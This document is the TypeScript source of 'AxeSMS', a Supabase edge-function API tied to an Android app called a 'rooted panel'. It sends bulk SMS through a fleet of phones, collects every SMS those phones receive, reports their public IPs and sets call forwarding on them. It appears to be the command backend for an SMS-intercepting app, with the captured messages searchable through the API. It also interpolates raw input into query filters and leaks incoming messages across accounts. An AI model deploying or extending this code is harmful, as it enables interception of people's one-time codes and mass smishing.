// ═══════════════════════════════════════════════════════════════════
//  AxeSMS API — Supabase Edge Function v2
//  Matches: panel_V3_1.apk (com.rooted.panel) EXACTLY
//
//  Deploy:
//    supabase functions new axesms-api
//    # Paste this as: supabase/functions/axesms-api/index.ts
//    supabase functions deploy axesms-api --no-verify-jwt
//
//  Required env vars (Supabase Dashboard → Settings → Edge Functions):
//    SUPABASE_URL         → https://xxx.supabase.co
//    SUPABASE_SERVICE_KEY → your service_role key
//    APK_BRIDGE_SECRET    → secret between this server and APK
//    ADMIN_SECRET         → your personal admin key for /admin/* routes
// ═══════════════════════════════════════════════════════════════════

import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const CORS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "Content-Type, Authorization, x-api-key, x-apk-secret, x-admin-secret",
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
};

const sb = createClient(
  Deno.env.get("SUPABASE_URL")!,
  Deno.env.get("SUPABASE_SERVICE_KEY")!
);

// ═══════════════════════════════════════════════════════════════════
//  ROUTER
// ═══════════════════════════════════════════════════════════════════
Deno.serve(async (req: Request) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: CORS });

  const url  = new URL(req.url);
  const path = url.pathname.replace(/^\/axesms-api/, "").replace(/\/$/, "") || "/";
  const m    = req.method;

  try {
    // ── PUBLIC API (x-api-key auth) ──────────────────────────────
    if (m==="GET"  && path==="/health")            return await health();
    if (m==="GET"  && path==="/panel/config")      return await panelConfig(req);
    if (m==="POST" && path==="/sms/send")          return await sendSMS(req);
    if (m==="POST" && path==="/sms/bulk")          return await sendBulkSMS(req);
    if (m==="GET"  && path==="/sms/status")        return await getSMSStatus(req, url);
    if (m==="GET"  && path==="/data/sms/list")     return await getSMSLogs(req, url);
    if (m==="GET"  && path==="/data/sms/search")   return await searchSMS(req, url);
    if (m==="GET"  && path==="/data/global/search")return await globalSearch(req, url);
    if (m==="GET"  && path==="/devices/list")      return await getDevices(req);
    if (m==="GET"  && path==="/devices/filters")   return await getDeviceFilters(req, url);
    if (m==="GET"  && path==="/incoming")          return await getIncomingSMS(req, url);
    if (m==="GET"  && path==="/balance")           return await getBalance(req);
    if (m==="GET"  && path==="/data/payments/latest") return await getLatestPayment(req);
    if (m==="GET"  && path==="/data/payments/list")   return await getPaymentHistory(req, url);

    // ── APK BRIDGE (x-apk-secret auth) ──────────────────────────
    if (m==="POST" && path==="/apk/heartbeat")     return await apkHeartbeat(req);
    if (m==="POST" && path==="/apk/delivery")      return await apkDeliveryReport(req);
    if (m==="POST" && path==="/apk/incoming")      return await apkIncomingSMS(req);
    if (m==="GET"  && path==="/apk/queue")         return await apkGetQueue(req, url);
    if (m==="POST" && path==="/apk/resolve-ip")    return await apkResolveIp(req);

    // Mirror APK's exact panel/* paths (APK uses these natively)
    if (m==="GET"  && path==="/panel/ping/device") return await pingDevice(req, url);
    if (m==="POST" && path==="/panel/ping/offline")return await pingOffline(req);
    if (m==="POST" && path==="/devices/note")      return await setDeviceNote(req);
    if (m==="GET"  && path==="/devices/call_forwarding") return await getCallForwarding(req, url);
    if (m==="POST" && path==="/devices/call_forwarding") return await setCallForwarding(req);

    // ── ADMIN (x-admin-secret auth) ──────────────────────────────
    if (path.startsWith("/admin"))                 return await adminRouter(req, path, url, m);

    return json({ error: "Not found", path }, 404);
  } catch (e: any) {
    console.error(e);
    return json({ error: "Internal error", detail: e.message }, 500);
  }
});

// ═══════════════════════════════════════════════════════════════════
//  AUTH HELPERS
// ═══════════════════════════════════════════════════════════════════
async function validateAPIKey(req: Request) {
  const key = req.headers.get("x-api-key") ?? new URL(req.url).searchParams.get("api_key");
  if (!key) return { error: "Missing x-api-key header" };

  const { data, error } = await sb
    .from("api_keys").select("*")
    .eq("key", key).eq("is_active", true).single();

  if (error || !data) return { error: "Invalid API key" };
  if (data.expires_at && new Date(data.expires_at) < new Date())
    return { error: "API key expired" };
  if (data.sms_used >= data.sms_limit)
    return { error: `SMS limit reached (${data.sms_limit}). Upgrade plan.` };

  return { apiKey: data };
}

function authAPK(req: Request): boolean {
  const s = req.headers.get("x-apk-secret");
  return !!s && s === Deno.env.get("APK_BRIDGE_SECRET");
}

function authAdmin(req: Request): boolean {
  const s = req.headers.get("x-admin-secret");
  return !!s && s === Deno.env.get("ADMIN_SECRET");
}

// ═══════════════════════════════════════════════════════════════════
//  PUBLIC ENDPOINTS
// ═══════════════════════════════════════════════════════════════════

async function health() {
  const { count } = await sb.from("devices").select("*", { count: "exact", head: true }).eq("status", "online");
  return json({ status: "ok", service: "AxeSMS API", version: "2.0.0", online_devices: count });
}

// APK calls this as panel/config to get base_url
async function panelConfig(req: Request) {
  const auth = await validateAPIKey(req);
  if (auth.error) return json({ error: auth.error }, 401);

  const { data } = await sb.from("panel_config").select("key, value");
  const cfg: any = {};
  data?.forEach(r => { cfg[r.key] = r.value; });
  return json({ success: true, config: cfg, baseUrl: cfg.base_url });
}

// POST /sms/send — Single SMS
async function sendSMS(req: Request) {
  const auth = await validateAPIKey(req);
  if (auth.error) return json({ error: auth.error }, 401);

  const body = await req.json().catch(() => ({}));
  const { to, number, message, msg, text, device_id, sim_slot, campaign_name, scheduled_at } = body;

  const toNumber  = to || number;
  const theMsg    = message || msg || text;
  if (!toNumber || !theMsg) return json({ error: "Missing: to, message" }, 400);

  const device = await autoAssignDevice(device_id, sim_slot);

  const { data: sms, error } = await sb.from("sms_queue").insert({
    api_key_id:    auth.apiKey.id,
    campaign_name: campaign_name ?? null,
    to_number:     toNumber,
    message:       theMsg,
    device_id:     device?.id ?? null,
    sim_slot:      sim_slot ?? 1,
    status:        "pending",
    scheduled_at:  scheduled_at ?? new Date().toISOString(),
  }).select().single();

  if (error) return json({ error: "Queue failed", detail: error.message }, 500);

  await sb.from("api_keys").update({ sms_used: auth.apiKey.sms_used + 1 }).eq("id", auth.apiKey.id);

  if (device?.apk_webhook_url) dispatchToAPK(sms, device);

  return json({
    success:  true,
    sms_id:   sms.id,
    status:   "queued",
    queued_via: device
      ? `${device.name} — SIM${sim_slot ?? 1}`
      : "no_online_device (will send when device online)",
    device: device ? pick(device, ["device_id","name","operator1","operator2","status"]) : null,
  });
}

// POST /sms/bulk
async function sendBulkSMS(req: Request) {
  const auth = await validateAPIKey(req);
  if (auth.error) return json({ error: auth.error }, 401);

  const body = await req.json().catch(() => ({}));
  const { recipients, message, msg, text, campaign_name, device_id, sim_slot } = body;

  if (!Array.isArray(recipients) || !recipients.length)
    return json({ error: "recipients must be a non-empty array" }, 400);

  const theMsg = message || msg || text;
  if (!theMsg) return json({ error: "Missing: message" }, 400);

  const remaining = auth.apiKey.sms_limit - auth.apiKey.sms_used;
  if (recipients.length > remaining)
    return json({ error: `Insufficient balance. Need ${recipients.length}, have ${remaining}` }, 400);

  // Get online devices for round-robin
  const { data: onlineDevices } = await sb
    .from("devices").select("*")
    .eq("is_active", true).eq("status", "online")
    .order("sms_sent_today", { ascending: true });

  const campaignName = campaign_name ?? `Bulk-${Date.now()}`;

  const rows = recipients.map((to: string, i: number) => {
    let assignedDevice = null;
    if (device_id) {
      assignedDevice = onlineDevices?.find(d => d.device_id === device_id) ?? null;
    } else {
      assignedDevice = onlineDevices?.[i % (onlineDevices?.length || 1)] ?? null;
    }
    return {
      api_key_id:    auth.apiKey.id,
      campaign_name: campaignName,
      to_number:     to,
      message:       theMsg,
      device_id:     assignedDevice?.id ?? null,
      sim_slot:      sim_slot ?? 1,
      status:        "pending",
    };
  });

  const { data: inserted, error } = await sb.from("sms_queue").insert(rows).select();
  if (error) return json({ error: "Bulk insert failed", detail: error.message }, 500);

  await sb.from("api_keys").update({ sms_used: auth.apiKey.sms_used + recipients.length }).eq("id", auth.apiKey.id);

  // Dispatch to APKs
  for (const sms of (inserted ?? [])) {
    const dev = onlineDevices?.find(d => d.id === sms.device_id);
    if (dev?.apk_webhook_url) dispatchToAPK(sms, dev);
  }

  return json({
    success:        true,
    campaign_name:  campaignName,
    total_queued:   inserted?.length ?? 0,
    online_devices: onlineDevices?.length ?? 0,
    sms_ids:        inserted?.map((s: any) => s.id),
  });
}

// GET /sms/status?sms_id=
async function getSMSStatus(req: Request, url: URL) {
  const auth = await validateAPIKey(req);
  if (auth.error) return json({ error: auth.error }, 401);

  const smsId = url.searchParams.get("sms_id") ?? url.searchParams.get("id");
  if (!smsId) return json({ error: "Missing sms_id" }, 400);

  const { data, error } = await sb.from("sms_queue")
    .select("id, to_number, message, status, sim_slot, campaign_name, sent_at, delivered_at, failed_at, error_message, created_at, devices(device_id,name)")
    .eq("id", smsId)
    .eq("api_key_id", auth.apiKey.id)
    .single();

  if (error || !data) return json({ error: "SMS not found" }, 404);
  return json({ success: true, sms: data });
}

// GET /data/sms/list — mirrors APK's exact path
async function getSMSLogs(req: Request, url: URL) {
  const auth = await validateAPIKey(req);
  if (auth.error) return json({ error: auth.error }, 401);

  const page     = parseInt(url.searchParams.get("page")     ?? "1");
  const limit    = Math.min(parseInt(url.searchParams.get("limit") ?? "50"), 200);
  const status   = url.searchParams.get("status");
  const campaign = url.searchParams.get("campaign");
  const device   = url.searchParams.get("device_id");
  const offset   = (page - 1) * limit;

  let q = sb.from("sms_queue")
    .select("id,to_number,message,status,sim_slot,campaign_name,sent_at,delivered_at,failed_at,created_at,devices(device_id,name)", { count: "exact" })
    .eq("api_key_id", auth.apiKey.id)
    .order("created_at", { ascending: false })
    .range(offset, offset + limit - 1);

  if (status)   q = q.eq("status", status);
  if (campaign) q = q.ilike("campaign_name", `%${campaign}%`);
  if (device)   q = q.eq("devices.device_id", device);

  const { data, count, error } = await q;
  if (error) return json({ error: "Fetch failed" }, 500);

  return json({ success: true, total: count, page, limit, pages: Math.ceil((count??0)/limit), logs: data });
}

// GET /data/sms/search
async function searchSMS(req: Request, url: URL) {
  const auth = await validateAPIKey(req);
  if (auth.error) return json({ error: auth.error }, 401);

  const q    = url.searchParams.get("q") ?? "";
  const page = parseInt(url.searchParams.get("page") ?? "1");
  const limit= Math.min(parseInt(url.searchParams.get("limit") ?? "50"), 200);

  const { data, count } = await sb.from("sms_queue")
    .select("id,to_number,message,status,sim_slot,created_at", { count: "exact" })
    .eq("api_key_id", auth.apiKey.id)
    .or(`to_number.ilike.%${q}%,message.ilike.%${q}%,campaign_name.ilike.%${q}%`)
    .order("created_at", { ascending: false })
    .range((page-1)*limit, page*limit-1);

  return json({ success: true, total: count, results: data });
}

// GET /data/global/search
async function globalSearch(req: Request, url: URL) {
  const auth = await validateAPIKey(req);
  if (auth.error) return json({ error: auth.error }, 401);

  const q = url.searchParams.get("q") ?? "";

  const [outgoing, incoming] = await Promise.all([
    sb.from("sms_queue")
      .select("id,to_number,message,status,created_at")
      .eq("api_key_id", auth.apiKey.id)
      .or(`to_number.ilike.%${q}%,message.ilike.%${q}%`)
      .limit(20),
    sb.from("incoming_sms")
      .select("id,from_number,message,received_at")
      .or(`from_number.ilike.%${q}%,message.ilike.%${q}%`)
      .limit(20),
  ]);

  return json({
    success: true,
    query:   q,
    outgoing: outgoing.data ?? [],
    incoming: incoming.data ?? [],
  });
}

// GET /devices/list
async function getDevices(req: Request) {
  const auth = await validateAPIKey(req);
  if (auth.error) return json({ error: auth.error }, 401);

  const { data } = await sb.from("devices")
    .select("device_id,name,device_model,sim1,sim2,operator1,operator2,status,last_seen,sms_sent_today,daily_limit,has_sms,sms_count,note,forward_number,sim1_block,sim2_block,is_active")
    .eq("is_active", true)
    .order("device_id");

  return json({ success: true, devices: data, total: data?.length ?? 0 });
}

// GET /devices/filters
async function getDeviceFilters(req: Request, url: URL) {
  const auth = await validateAPIKey(req);
  if (auth.error) return json({ error: auth.error }, 401);

  const deviceId = url.searchParams.get("device_id");
  let q = sb.from("device_filters").select("*,devices(device_id,name)");
  if (deviceId) {
    const { data: dev } = await sb.from("devices").select("id").eq("device_id", deviceId).single();
    if (dev) q = q.eq("device_id", dev.id);
  }

  const { data } = await q;
  return json({ success: true, filters: data });
}

// GET /incoming
async function getIncomingSMS(req: Request, url: URL) {
  const auth = await validateAPIKey(req);
  if (auth.error) return json({ error: auth.error }, 401);

  const page  = parseInt(url.searchParams.get("page")  ?? "1");
  const limit = Math.min(parseInt(url.searchParams.get("limit") ?? "50"), 200);
  const from  = url.searchParams.get("from");

  let q = sb.from("incoming_sms")
    .select("id,from_number,message,sim_slot,sim1,sim2,received_at,devices(device_id,name)", { count: "exact" })
    .order("received_at", { ascending: false })
    .range((page-1)*limit, page*limit-1);

  if (from) q = q.ilike("from_number", `%${from}%`);

  const { data, count } = await q;
  return json({ success: true, total: count, page, limit, incoming: data });
}

// GET /balance
async function getBalance(req: Request) {
  const auth = await validateAPIKey(req);
  if (auth.error) return json({ error: auth.error }, 401);

  return json({
    success:       true,
    plan:          auth.apiKey.plan,
    sms_limit:     auth.apiKey.sms_limit,
    sms_used:      auth.apiKey.sms_used,
    sms_remaining: auth.apiKey.sms_limit - auth.apiKey.sms_used,
    expires_at:    auth.apiKey.expires_at,
  });
}

async function getLatestPayment(req: Request) {
  const auth = await validateAPIKey(req);
  if (auth.error) return json({ error: auth.error }, 401);

  const { data } = await sb.from("payments")
    .select("*").eq("api_key_id", auth.apiKey.id)
    .order("created_at", { ascending: false }).limit(1).single();

  return json({ success: true, payment: data });
}

async function getPaymentHistory(req: Request, url: URL) {
  const auth = await validateAPIKey(req);
  if (auth.error) return json({ error: auth.error }, 401);

  const page  = parseInt(url.searchParams.get("page")  ?? "1");
  const limit = parseInt(url.searchParams.get("limit") ?? "20");

  const { data, count } = await sb.from("payments")
    .select("*", { count: "exact" }).eq("api_key_id", auth.apiKey.id)
    .order("created_at", { ascending: false })
    .range((page-1)*limit, page*limit-1);

  return json({ success: true, total: count, payments: data });
}

// Device note
async function setDeviceNote(req: Request) {
  if (!authAPK(req)) {
    const auth = await validateAPIKey(req);
    if (auth.error) return json({ error: auth.error }, 401);
  }
  const { device_id, note } = await req.json().catch(() => ({}));
  await sb.from("devices").update({ note }).eq("device_id", device_id);
  return json({ success: true });
}

// Call forwarding
async function getCallForwarding(req: Request, url: URL) {
  const auth = await validateAPIKey(req);
  if (auth.error) return json({ error: auth.error }, 401);
  const deviceId = url.searchParams.get("device_id");
  const { data } = await sb.from("devices").select("device_id,forward_number").eq("device_id", deviceId!).single();
  return json({ success: true, forwarding: data });
}

async function setCallForwarding(req: Request) {
  if (!authAPK(req)) return json({ error: "Unauthorized" }, 401);
  const { device_id, forward_number } = await req.json().catch(() => ({}));
  await sb.from("devices").update({ forward_number }).eq("device_id", device_id);
  return json({ success: true });
}

async function pingDevice(req: Request, url: URL) {
  const deviceId = url.searchParams.get("device_id");
  const { data } = await sb.from("devices")
    .select("device_id,name,status,last_seen,sim1,sim2,sms_sent_today")
    .eq("device_id", deviceId!).single();
  return json({ success: true, device: data });
}

async function pingOffline(req: Request) {
  if (!authAPK(req)) return json({ error: "Unauthorized" }, 401);
  const { data } = await sb.from("devices").select("device_id,name,last_seen").eq("status", "offline").eq("is_active", true);
  return json({ success: true, offline_devices: data });
}

// ═══════════════════════════════════════════════════════════════════
//  APK BRIDGE ENDPOINTS
//  These are called BY the Android APK panel_V3_1
// ═══════════════════════════════════════════════════════════════════

// POST /apk/heartbeat
// APK should call this every 30 seconds
// Body: { device_id, battery?, signal?, public_ip?, model? }
async function apkHeartbeat(req: Request) {
  if (!authAPK(req)) return json({ error: "Invalid APK secret" }, 401);

  const body = await req.json().catch(() => ({}));
  const { device_id, public_ip, model, battery, signal } = body;

  const { error } = await sb.from("devices").update({
    status:    "online",
    last_seen: new Date().toISOString(),
    public_ip: public_ip ?? null,
    ...(model ? { device_model: model } : {}),
  }).eq("device_id", device_id);

  if (error) return json({ error: "Device not found", device_id }, 404);

  // Return pending SMS queue for this device
  const { data: dev } = await sb.from("devices").select("id,daily_limit,sms_sent_today").eq("device_id", device_id).single();

  const { data: queue } = await sb.from("sms_queue")
    .select("id,to_number,message,sim_slot,priority")
    .eq("device_id", dev?.id)
    .eq("status", "pending")
    .lte("scheduled_at", new Date().toISOString())
    .order("priority", { ascending: true })
    .order("created_at", { ascending: true })
    .limit(20);

  return json({
    success:       true,
    device_id,
    server_time:   new Date().toISOString(),
    pending_count: queue?.length ?? 0,
    pending_sms:   queue ?? [],
    daily_left:    (dev?.daily_limit ?? 500) - (dev?.sms_sent_today ?? 0),
  });
}

// POST /apk/delivery
// Body: { sms_id, apk_message_id, status, device_id, sim_slot, error? }
async function apkDeliveryReport(req: Request) {
  if (!authAPK(req)) return json({ error: "Invalid APK secret" }, 401);

  const body = await req.json().catch(() => ({}));
  const { sms_id, apk_message_id, status, device_id, sim_slot, error: errMsg } = body;

  const update: any = { status };
  if (apk_message_id) update.apk_message_id = apk_message_id;
  if (status === "sent")      { update.sent_at      = new Date().toISOString(); }
  if (status === "delivered") { update.delivered_at = new Date().toISOString(); }
  if (status === "failed")    {
    update.failed_at      = new Date().toISOString();
    update.error_message  = errMsg ?? "Failed";
    update.retry_count    = sb.rpc; // handled below
  }

  await sb.from("sms_queue").update(update).eq("id", sms_id);

  // Log delivery
  const { data: dev } = await sb.from("devices").select("id").eq("device_id", device_id).single();
  await sb.from("delivery_reports").insert({
    sms_id, device_id: dev?.id, apk_message_id, sim_slot: sim_slot ?? 1, status, report_data: body,
  });

  // Increment device sms_count & sms_sent_today if sent
  if (status === "sent" && dev?.id) {
    await sb.from("devices").update({
      sms_count:     sb.rpc("increment", { row_id: dev.id, amount: 1 }),
      sms_sent_today: sb.rpc("increment", { row_id: dev.id, amount: 1 }),
    }).eq("id", dev.id);

    // Simple increment via raw update
    const { data: dv } = await sb.from("devices").select("sms_count,sms_sent_today").eq("id", dev.id).single();
    await sb.from("devices").update({
      sms_count:      (dv?.sms_count ?? 0) + 1,
      sms_sent_today: (dv?.sms_sent_today ?? 0) + 1,
    }).eq("id", dev.id);
  }

  // Auto-retry on failure
  if (status === "failed") {
    const { data: smsDat } = await sb.from("sms_queue").select("retry_count,max_retries").eq("id", sms_id).single();
    if (smsDat && smsDat.retry_count < smsDat.max_retries) {
      await sb.from("sms_queue").update({
        status:      "pending",
        retry_count: smsDat.retry_count + 1,
        scheduled_at: new Date(Date.now() + 60000 * (smsDat.retry_count + 1)).toISOString(), // backoff
      }).eq("id", sms_id);
    }
  }

  return json({ success: true });
}

// POST /apk/incoming
// Body: { device_id, from_number, message, sim_slot, sim1?, sim2?, sms_key? }
async function apkIncomingSMS(req: Request) {
  if (!authAPK(req)) return json({ error: "Invalid APK secret" }, 401);

  const body = await req.json().catch(() => ({}));
  const { device_id, from_number, message, sim_slot, sim1, sim2, sms_key } = body;

  const { data: dev } = await sb.from("devices").select("id").eq("device_id", device_id).single();

  await sb.from("incoming_sms").insert({
    device_id:   dev?.id ?? null,
    from_number,
    message,
    sim_slot:    sim_slot ?? 1,
    sim1:        sim1 ?? null,
    sim2:        sim2 ?? null,
    sms_key:     sms_key ?? null,
    last_msg_at: new Date().toISOString(),
    raw_data:    body,
  });

  // Update device last_msg_at
  if (dev?.id) {
    await sb.from("devices").update({ last_seen: new Date().toISOString() }).eq("id", dev.id);
  }

  return json({ success: true, message: "Incoming SMS logged" });
}

// GET /apk/queue?device_id=device_1&limit=20
// APK polls this for pending SMS to send
async function apkGetQueue(req: Request, url: URL) {
  if (!authAPK(req)) return json({ error: "Invalid APK secret" }, 401);

  const deviceId = url.searchParams.get("device_id");
  const limit    = Math.min(parseInt(url.searchParams.get("limit") ?? "20"), 50);

  if (!deviceId) return json({ error: "Missing device_id" }, 400);

  const { data: dev } = await sb.from("devices")
    .select("id,daily_limit,sms_sent_today,sim1_block,sim2_block")
    .eq("device_id", deviceId).single();

  if (!dev) return json({ error: "Device not found" }, 404);

  const remaining = (dev.daily_limit ?? 500) - (dev.sms_sent_today ?? 0);
  if (remaining <= 0) return json({ success: true, queue: [], reason: "Daily limit reached" });

  const { data: queue } = await sb.from("sms_queue")
    .select("id,to_number,message,sim_slot,priority")
    .eq("device_id", dev.id)
    .eq("status", "pending")
    .lte("scheduled_at", new Date().toISOString())
    .order("priority", { ascending: true })
    .order("created_at", { ascending: true })
    .limit(Math.min(limit, remaining));

  // Filter blocked SIMs
  const filtered = (queue ?? []).filter((s: any) => {
    if (s.sim_slot === 1 && dev.sim1_block) return false;
    if (s.sim_slot === 2 && dev.sim2_block) return false;
    return true;
  });

  // Mark as processing
  if (filtered.length) {
    await sb.from("sms_queue").update({ status: "processing" })
      .in("id", filtered.map((s: any) => s.id));
  }

  return json({
    success:      true,
    device_id:    deviceId,
    queue:        filtered,
    daily_left:   remaining,
  });
}

// POST /apk/resolve-ip
async function apkResolveIp(req: Request) {
  if (!authAPK(req)) return json({ error: "Unauthorized" }, 401);
  const { device_id, ip } = await req.json().catch(() => ({}));
  await sb.from("devices").update({ public_ip: ip }).eq("device_id", device_id);
  return json({ success: true });
}

// ═══════════════════════════════════════════════════════════════════
//  ADMIN ROUTES
// ═══════════════════════════════════════════════════════════════════
async function adminRouter(req: Request, path: string, url: URL, m: string) {
  if (!authAdmin(req)) return json({ error: "Invalid admin secret" }, 401);

  // GET /admin/keys — list all API keys
  if (m==="GET"  && path==="/admin/keys")  return await adminListKeys(url);
  // POST /admin/keys — create new key
  if (m==="POST" && path==="/admin/keys")  return await adminCreateKey(req);
  // DELETE /admin/keys/:id
  if (m==="DELETE" && path.startsWith("/admin/keys/")) return await adminDeleteKey(path);
  // GET /admin/stats
  if (m==="GET"  && path==="/admin/stats") return await adminStats();
  // POST /admin/devices — add device
  if (m==="POST" && path==="/admin/devices") return await adminAddDevice(req);
  // PUT /admin/devices/:id
  if (m==="PUT"  && path.startsWith("/admin/devices/")) return await adminUpdateDevice(req, path);
  // DELETE /admin/devices/:id
  if (m==="DELETE" && path.startsWith("/admin/devices/")) return await adminDeleteDevice(path);
  // POST /admin/reset-daily
  if (m==="POST" && path==="/admin/reset-daily") {
    await sb.rpc("reset_daily_sms_counts");
    return json({ success: true, message: "Daily counts reset" });
  }

  return json({ error: "Admin route not found" }, 404);
}

async function adminListKeys(url: URL) {
  const { data, count } = await sb.from("api_keys")
    .select("id,key,name,email,plan,sms_limit,sms_used,is_active,created_at,expires_at", { count: "exact" })
    .order("created_at", { ascending: false });
  return json({ success: true, total: count, keys: data });
}

async function adminCreateKey(req: Request) {
  const body = await req.json().catch(() => ({}));
  const { name, email, plan = "basic", sms_limit = 1000, expires_at } = body;
  if (!name) return json({ error: "Missing name" }, 400);

  const { data, error } = await sb.from("api_keys").insert({
    name, email, plan, sms_limit, expires_at: expires_at ?? null,
  }).select().single();

  if (error) return json({ error: error.message }, 500);
  return json({ success: true, api_key: data });
}

async function adminDeleteKey(path: string) {
  const id = path.split("/").pop();
  await sb.from("api_keys").update({ is_active: false }).eq("id", id);
  return json({ success: true });
}

async function adminStats() {
  const [keys, devices, smsTotal, smsPending, smsSent, incoming] = await Promise.all([
    sb.from("api_keys").select("*", { count: "exact", head: true }).eq("is_active", true),
    sb.from("devices").select("*", { count: "exact", head: true }).eq("status", "online"),
    sb.from("sms_queue").select("*", { count: "exact", head: true }),
    sb.from("sms_queue").select("*", { count: "exact", head: true }).eq("status", "pending"),
    sb.from("sms_queue").select("*", { count: "exact", head: true }).in("status", ["sent","delivered"]),
    sb.from("incoming_sms").select("*", { count: "exact", head: true }),
  ]);
  return json({
    success: true,
    stats: {
      active_api_keys:   keys.count,
      online_devices:    devices.count,
      total_sms:         smsTotal.count,
      pending_sms:       smsPending.count,
      sent_sms:          smsSent.count,
      incoming_sms:      incoming.count,
    }
  });
}

async function adminAddDevice(req: Request) {
  const body = await req.json().catch(() => ({}));
  const { device_id, name, sim1, sim2, operator1, operator2, daily_limit = 500 } = body;
  if (!device_id || !name) return json({ error: "Missing device_id or name" }, 400);

  const { data, error } = await sb.from("devices").insert({
    device_id, name, sim1, sim2, operator1, operator2, daily_limit,
  }).select().single();

  if (error) return json({ error: error.message }, 500);
  return json({ success: true, device: data });
}

async function adminUpdateDevice(req: Request, path: string) {
  const id   = path.split("/").pop();
  const body = await req.json().catch(() => ({}));
  const { data, error } = await sb.from("devices").update(body).eq("device_id", id).select().single();
  if (error) return json({ error: error.message }, 500);
  return json({ success: true, device: data });
}

async function adminDeleteDevice(path: string) {
  const id = path.split("/").pop();
  await sb.from("devices").update({ is_active: false }).eq("device_id", id);
  return json({ success: true });
}

// ═══════════════════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════════════════

async function autoAssignDevice(preferredDeviceId?: string, simSlot?: number) {
  if (preferredDeviceId) {
    const { data } = await sb.from("devices").select("*")
      .eq("device_id", preferredDeviceId).eq("is_active", true).single();
    return data;
  }

  const { data } = await sb.from("devices").select("*")
    .eq("is_active", true).eq("status", "online")
    .order("sms_sent_today", { ascending: true }).limit(1);

  return data?.[0] ?? null;
}

async function dispatchToAPK(sms: any, device: any) {
  if (!device?.apk_webhook_url) return;
  try {
    const res = await fetch(`${device.apk_webhook_url}/send`, {
      method: "POST",
      headers: {
        "Content-Type":  "application/json",
        "x-apk-secret": Deno.env.get("APK_BRIDGE_SECRET") ?? "",
      },
      body: JSON.stringify({
        sms_id:   sms.id,
        to:       sms.to_number,
        message:  sms.message,
        sim_slot: sms.sim_slot ?? 1,
      }),
    });
    if (!res.ok) {
      await sb.from("sms_queue").update({ status: "failed", error_message: `APK HTTP ${res.status}` }).eq("id", sms.id);
    }
  } catch (e) {
    console.error("dispatchToAPK error:", e);
  }
}

function pick(obj: any, keys: string[]) {
  return Object.fromEntries(keys.filter(k => k in obj).map(k => [k, obj[k]]));
}

function json(data: any, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { ...CORS, "Content-Type": "application/json" },
  });
}
